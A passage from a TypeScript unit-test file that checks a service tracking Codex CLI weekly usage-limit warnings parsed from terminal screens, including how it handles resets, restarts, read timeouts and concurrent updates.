    const after = setup({ screen: SCREEN, loadWeeks: () => JSON.parse(JSON.stringify(saved.at(-1))) })
    after.tick(120000)
    expect(await after.svc.knownWeek('mac', [], rolled)).toMatchObject({ used: 0, resetsAt: RESET_AT })
  })

  it('the warning follows the screen: shown, gone, back as Codex shows it', async () => {
    const o: { screen: string | Error } = { screen: SCREEN }
    const { svc, pane, tick } = setup(o)
    expect((await svc.compute(pane))?.weekly).toEqual({ left: 12, lessThan: false })
    // Codex no longer shows it (here: /status after an early reset), even
    // though the rollout still says 10 % left.
    o.screen = RESET_SCREEN
    tick(60000)
    expect((await svc.compute(pane))?.weekly).toBeUndefined()
    // Codex restarted: only its startup heads-up.
    o.screen = '  >_ OpenAI Codex (v0.160.0)\n⚠ Heads up, you have less than 5% of your weekly limit left. Run /status for a breakdown.\n› Ask Codex to do anything'
    tick(60000)
    expect((await svc.compute(pane))?.weekly).toEqual({ left: 5, lessThan: true })
    // A screen that cannot be read for a moment keeps the last warning.
    o.screen = new Error('timeout')
    tick(60000)
    expect((await svc.compute(pane))?.weekly).toEqual({ left: 5, lessThan: true })
  })

  it('refuses a second update while one runs', async () => {
    const { svc, pane } = setup({ hang: true })
    await svc.startUpdate(pane)
    await expect(svc.startUpdate(pane)).rejects.toThrow(/already in progress/)
  })
})
